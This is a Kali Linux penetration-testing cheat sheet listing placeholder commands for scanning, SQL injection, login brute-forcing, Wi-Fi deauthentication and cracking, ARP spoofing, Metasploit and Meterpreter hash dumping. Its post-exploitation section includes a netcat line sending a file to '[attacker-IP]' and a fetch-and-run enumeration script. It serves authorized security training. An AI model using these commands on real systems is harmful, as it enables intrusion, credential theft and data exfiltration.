# Kali Linux and Penetration Testing Cheat Sheet

A comprehensive guide to essential Kali Linux tools and commands for ethical hacking and penetration testing.

---

**Disclaimer:** This cheat sheet is intended for educational purposes and authorized security testing only. Always obtain proper consent before performing any security assessments. Unauthorized access or attacks on systems without permission is illegal and unethical.

---

## Table of Contents

1. [Getting Started with Kali Linux](#1-getting-started-with-kali-linux)
2. [Information Gathering](#2-information-gathering)
3. [Vulnerability Analysis](#3-vulnerability-analysis)
4. [Web Application Analysis](#4-web-application-analysis)
5. [Database Assessment](#5-database-assessment)
6. [Password Attacks](#6-password-attacks)
7. [Wireless Attacks](#7-wireless-attacks)
8. [Exploitation Tools](#8-exploitation-tools)
9. [Sniffing and Spoofing](#9-sniffing-and-spoofing)
10. [Post Exploitation](#10-post-exploitation)
11. [Reporting Tools](#11-reporting-tools)
12. [Useful Resources](#12-useful-resources)

---

## 1. Getting Started with Kali Linux

### System Update and Upgrade

- Update package lists:

  ```bash
  sudo apt update
  ```

- Upgrade installed packages:

  ```bash
  sudo apt upgrade
  ```

- Full system upgrade (including kernel updates):

  ```bash
  sudo apt full-upgrade
  ```

### Package Management

- Search for a package:

  ```bash
  sudo apt search [package]
  ```

- Install a package:

  ```bash
  sudo apt install [package]
  ```

- Remove a package:

  ```bash
  sudo apt remove [package]
  ```

### Kali Metapackages

Kali Linux provides metapackages that bundle tools by category.

- List available metapackages:

  ```bash
  apt-cache search kali-linux
  ```

- Install a metapackage:

  ```bash
  sudo apt install [metapackage-name]
  ```

  Common metapackages:

  - `kali-linux-top10`
  - `kali-linux-default`
  - `kali-linux-all`

[Back to Top](#table-of-contents)

---

## 2. Information Gathering

### Nmap - Network Scanner

- Basic scan:

  ```bash
  nmap [target-IP]
  ```

- Scan specific ports:

  ```bash
  nmap -p [port-range] [target]
  ```

- Aggressive scan with version detection:

  ```bash
  nmap -A [target]
  ```

- Save output to file:

  ```bash
  nmap -oN [output.txt] [target]
  ```

### Nikto - Web Server Scanner

- Scan a web server:

  ```bash
  nikto -h [target-URL]
  ```

- Use SSL:

  ```bash
  nikto -h https://[target]
  ```

### Whois Lookup

- Perform a whois lookup:

  ```bash
  whois [domain]
  ```

### DNS Enumeration

- DNS zone transfer (using `dig`):

  ```bash
  dig axfr @[NS-server] [domain]
  ```

- DNS reconnaissance with `dnsenum`:

  ```bash
  dnsenum [domain]
  ```

### Recon-ng - Reconnaissance Framework

- Start Recon-ng:

  ```bash
  recon-ng
  ```

- Add API keys for modules:

  ```bash
  keys add [service] [API-key]
  ```

[Back to Top](#table-of-contents)

---

## 3. Vulnerability Analysis

### OpenVAS - Vulnerability Scanner

- Start OpenVAS setup:

  ```bash
  sudo gvm-setup
  ```

- Start OpenVAS services:

  ```bash
  sudo gvm-start
  ```

- Access the web interface at:

  ```
  https://127.0.0.1:9392
  ```

### Nessus - Vulnerability Scanner

- Download Nessus from [Tenable](https://www.tenable.com/products/nessus/nessus-essentials).

- Install Nessus:

  ```bash
  sudo dpkg -i [nessus-package.deb]
  ```

- Start Nessus service:

  ```bash
  sudo systemctl start nessusd
  ```

- Access the web interface at:

  ```
  https://localhost:8834
  ```

[Back to Top](#table-of-contents)

---

## 4. Web Application Analysis

### OWASP ZAP - Zed Attack Proxy

- Start OWASP ZAP:

  ```bash
  zaproxy
  ```

- Configure browser proxy settings to:

  ```
  Host: 127.0.0.1
  Port: 8080
  ```

### Burp Suite

- Start Burp Suite:

  ```bash
  burpsuite
  ```

- Configure browser to use Burp Proxy:

  ```
  Host: 127.0.0.1
  Port: 8080
  ```

### SQLMap - Automated SQL Injection Tool

- Basic SQL injection test:

  ```bash
  sqlmap -u "http://[target]/page.php?id=1"
  ```

- Enumerate databases:

  ```bash
  sqlmap -u "http://[target]/page.php?id=1" --dbs
  ```

- Dump a database:

  ```bash
  sqlmap -u "http://[target]/page.php?id=1" -D [database] --tables
  ```

### Dirb - Content Brute Forcing

- Basic scan:

  ```bash
  dirb http://[target]
  ```

- Custom wordlist:

  ```bash
  dirb http://[target] /path/to/wordlist.txt
  ```

[Back to Top](#table-of-contents)

---

## 5. Database Assessment

### SQLMap (revisited)

- Test POST parameters:

  ```bash
  sqlmap -u "http://[target]/" --data="username=admin&password=admin"
  ```

### NoSQLMap - MongoDB Testing

- Start NoSQLMap:

  ```bash
  python nosqlmap.py
  ```

### jSQL Injection

- Start jSQL:

  ```bash
  jsql
  ```

[Back to Top](#table-of-contents)

---

## 6. Password Attacks

### Hydra - Network Logon Cracker

- Brute-force FTP login:

  ```bash
  hydra -l [user] -P [wordlist.txt] [target] ftp
  ```

- Brute-force HTTP login:

  ```bash
  hydra -L [users.txt] -P [wordlist.txt] [target] http-form-post '/login:username=^USER^&password=^PASS^:F=incorrect'
  ```

### John the Ripper

- Crack a password hash:

  ```bash
  john [hashfile]
  ```

- Specify wordlist:

  ```bash
  john --wordlist=[wordlist.txt] [hashfile]
  ```

### Medusa - Parallel Login Brute-Forcer

- Brute-force SSH login:

  ```bash
  medusa -h [target] -u [user] -P [wordlist.txt] -M ssh
  ```

### Hashcat - Advanced Password Recovery

- Crack hashes with GPU acceleration:

  ```bash
  hashcat -m [hash-type] -a 0 [hashfile] [wordlist.txt]
  ```

- Example for MD5:

  ```bash
  hashcat -m 0 -a 0 hashes.txt wordlist.txt
  ```

[Back to Top](#table-of-contents)

---

## 7. Wireless Attacks

### Aircrack-ng Suite

#### Monitor Mode

- List wireless interfaces:

  ```bash
  iwconfig
  ```

- Start monitor mode:

  ```bash
  airmon-ng start [interface]
  ```

#### Capture Handshake

- Scan for Wi-Fi networks:

  ```bash
  airodump-ng [interface]
  ```

- Capture on specific channel and BSSID:

  ```bash
  airodump-ng -c [channel] --bssid [BSSID] -w [capture-file] [interface]
  ```

#### Deauthentication Attack

- Send deauth packets to capture handshake:

  ```bash
  aireplay-ng --deauth [number] -a [AP BSSID] -c [client MAC] [interface]
  ```

#### Crack Wi-Fi Password

- Crack WPA/WPA2 handshake:

  ```bash
  aircrack-ng -w [wordlist.txt] -b [BSSID] [capture-file].cap
  ```

[Back to Top](#table-of-contents)

---

## 8. Exploitation Tools

### Metasploit Framework

- Start Metasploit console:

  ```bash
  msfconsole
  ```

- Search for a module:

  ```bash
  search [name or CVE]
  ```

- Use a module:

  ```bash
  use [module-path]
  ```

- Show options:

  ```bash
  show options
  ```

- Set a parameter:

  ```bash
  set [option] [value]
  ```

- Run the exploit:

  ```bash
  exploit
  ```

### Exploit-DB Search

- Search exploit database:

  ```bash
  searchsploit [search-term]
  ```

- View exploit details:

  ```bash
  searchsploit -x [path/to/exploit]
  ```

### BeEF - Browser Exploitation Framework

- Start BeEF:

  ```bash
  beef-xss
  ```

- Access the web interface at:

  ```
  http://127.0.0.1:3000/ui/panel
  ```

[Back to Top](#table-of-contents)

---

## 9. Sniffing and Spoofing

### Wireshark - Network Protocol Analyzer

- Start Wireshark:

  ```bash
  wireshark
  ```

- Capture packets on an interface.

### Tcpdump - Command Line Packet Analyzer

- Capture packets on interface:

  ```bash
  tcpdump -i [interface]
  ```

- Write capture to file:

  ```bash
  tcpdump -i [interface] -w [file.pcap]
  ```

### Ettercap - Network Sniffer/Interceptor

- Start GUI:

  ```bash
  ettercap -G
  ```

- ARP poisoning:

  ```bash
  ettercap -T -q -i [interface] -M arp:remote /[target]/ /[gateway]/
  ```

### ARP Spoofing with arpspoof

- Enable IP forwarding:

  ```bash
  echo 1 > /proc/sys/net/ipv4/ip_forward
  ```

- ARP spoof target:

  ```bash
  arpspoof -i [interface] -t [target-IP] [gateway-IP]
  ```

[Back to Top](#table-of-contents)

---

## 10. Post Exploitation

### Meterpreter Commands (Metasploit)

- List processes:

  ```bash
  ps
  ```

- Migrate to another process:

  ```bash
  migrate [PID]
  ```

- Get system information:

  ```bash
  sysinfo
  ```

- Dump password hashes (Windows):

  ```bash
  hashdump
  ```

- Capture a screenshot:

  ```bash
  screenshot
  ```

### Privilege Escalation Enumeration Scripts

- Linux:

  ```bash
  wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
  chmod +x LinEnum.sh
  ./LinEnum.sh
  ```

- Windows:

  - Download and run [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS).

### Data Exfiltration with Netcat

- On attacking machine (listening):

  ```bash
  nc -lvp [port] > [file]
  ```

- On target machine (sending):

  ```bash
  nc [attacker-IP] [port] < [file]
  ```

[Back to Top](#table-of-contents)

---

## 11. Reporting Tools

### Dradis Framework

- Start Dradis:

  ```bash
  dradis
  ```

- Access the web interface at:

  ```
  http://localhost:3000
  ```

### MagicTree

- Start MagicTree:

  ```bash
  magictree
  ```

### Faraday IDE - Collaborative Penetration Test IDE

- Start Faraday:

  ```bash
  faraday-client
  ```

- Access the web interface at:

  ```
  http://localhost:5985
  ```

[Back to Top](#table-of-contents)

---

## 12. Useful Resources

- **Kali Linux Documentation:** [https://www.kali.org/docs/](https://www.kali.org/docs/)
- **Offensive Security Training:** [https://www.offensive-security.com/](https://www.offensive-security.com/)
- **OWASP Top Ten:** [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)
- **Exploit Database:** [https://www.exploit-db.com/](https://www.exploit-db.com/)
- **PayloadsAllTheThings:** [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- **GTFOBins:** [https://gtfobins.github.io/](https://gtfobins.github.io/)

[Back to Top](#table-of-contents)
